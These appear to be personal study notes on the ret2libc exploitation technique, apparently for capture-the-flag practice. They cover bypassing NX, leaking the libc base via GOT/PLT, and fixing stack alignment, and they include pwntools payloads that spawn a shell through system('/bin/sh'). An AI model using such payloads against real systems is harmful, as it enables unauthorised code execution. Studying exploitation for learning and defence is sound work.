## no `win()`, NX on
- NOTE: DON’T forget `ret` gadget
- goal: bypass NX bit protection, call `system("/bin/sh")`
![[ret2libc-1.png]]
- NOTE: ret2system in 32bit different from that in 64bit
	- 32bit: system  + 4 byte fake ret addr + addr of /bin/sh
	- 64bit: pop rdi + addr of /bin/sh + system
### x32
- find systema addr: `p system`
- add a fake ret addr, `exit` in this case : `p exit` (16 byte align)
- find "/bin/sh" : `grep "/bin/sh" libc`
### x64
- GOT/global offset table: contains addr of libc funcs
- PLT/prodecure linkage table: execute func in GOT
- leak libc base via GOT dereference
- `pwninit` : link elf file with libc file
- `log.info` : print log
- `libc.address` : assign addr for libc
- `.search` : search all data/string
- `.sym` : search func in symbol table
#### stage 1: leak libc base
- goal: call `puts(puts_got)` to print real addr, then return to `main`
- payload
	```python
	payload = b"A" * offset
	payload += p64(pop_rdi) + p64(exe.got['puts']) # arg as rdi: addr of GOT
	payload += p64(exe.plt['puts'])                # call puts
	payload += p64(exe.sym['main'])                # back to main
	```
- find libc ver based on leaked addr on [libc.blukat](https://libc.blukat.me/)
- calculate libc addr
	```python
	leak = u64(p.recv(6).ljust(8, b"\x00")) # unpack (pad to 8 bytes)
	libc.address = leak - libc.sym['puts']  # set libc base # libc.sym: offset from start of libc to puts
	```
#### stage 2: get shell
- goal: call `system("/bin/sh")`    
- stack alignment fix: `system` (movaps) crashes if stack is not 16-byte aligned    
- gadget from binary / libc : `ROPgadget --binary chall/libc.so.6 | grep "pop rdi"`
- find `system` : `p&system`
- find `/bin/sh` : `strings -a -t x <libc_start_destination> | grep "/bin/sh"`
- fix: insert a `ret` gadget (acts as NOP) to shift RSP by 8 bytes    
- payload
	```python
	payload = b"A" * offset
	payload += p64(ret)
	payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
	payload += p64(libc.sym['system'])
	```
